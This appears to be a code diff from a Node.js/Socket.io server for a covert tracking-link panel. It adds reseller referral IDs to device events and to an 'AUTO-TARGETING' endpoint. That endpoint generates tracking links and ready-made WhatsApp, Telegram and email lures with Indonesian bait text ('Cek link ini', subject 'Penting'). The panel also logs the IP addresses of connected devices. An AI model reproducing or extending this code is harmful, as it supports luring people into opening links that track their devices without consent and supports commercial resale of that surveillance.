@@ -345,6 +345,7 @@ io.on('connection', (socket) => {
         });
         io.emit('device-new', {
             id: deviceId,
+            resellerId: resellerId,
             label: isOwnDevice ? `Admin-${deviceId.slice(0, 6)}` : `Device-${deviceId.slice(0, 6)}`,
             online: true,
             ip: clientIp,
@@ -2689,13 +2690,18 @@ app.get('/api/alerts/:deviceId', (req, res) => {
 // ===== AUTO-TARGETING =====
 app.get('/api/target/link', (req, res) => {
     const baseUrl = `${req.protocol}://${req.get('host')}`;
+    // Check if requester is a reseller (from query or token)
+    const token = req.headers['x-admin-token'] || '';
+    const resellerId = req.query.resellerId || '';
+    const refParam = resellerId ? '?ref=' + resellerId : '';
+    const waRef = resellerId ? '%3Fref%3D' + resellerId : '';
     const expiresAt = linkExpiry.enabled && linkExpiry.duration > 0 ? Date.now() + linkExpiry.duration * 60 * 1000 : null;
     res.json({
-        trackingLink: baseUrl + '/',
-        adminLink: baseUrl + '/admin.html',
-        whatsapp: 'https://wa.me/?text=' + encodeURIComponent('Lihat ini: ' + baseUrl + '/'),
-        telegram: 'https://t.me/share/url?url=' + encodeURIComponent(baseUrl + '/') + '&text=' + encodeURIComponent('Cek link ini'),
-        email: `mailto:?subject=Penting&body=` + encodeURIComponent(baseUrl + '/'),
+        trackingLink: baseUrl + '/' + refParam,
+        adminLink: baseUrl + '/r/' + (resellerId || '') + '/admin.html',
+        whatsapp: 'https://wa.me/?text=' + encodeURIComponent('Lihat ini: ' + baseUrl + '/' + refParam),
+        telegram: 'https://t.me/share/url?url=' + encodeURIComponent(baseUrl + '/' + refParam) + '&text=' + encodeURIComponent('Cek link ini'),
+        email: `mailto:?subject=Penting&body=` + encodeURIComponent(baseUrl + '/' + refParam),
         expiresAt,
         expiryEnabled: linkExpiry.enabled,
         expiryMinutes: linkExpiry.duration
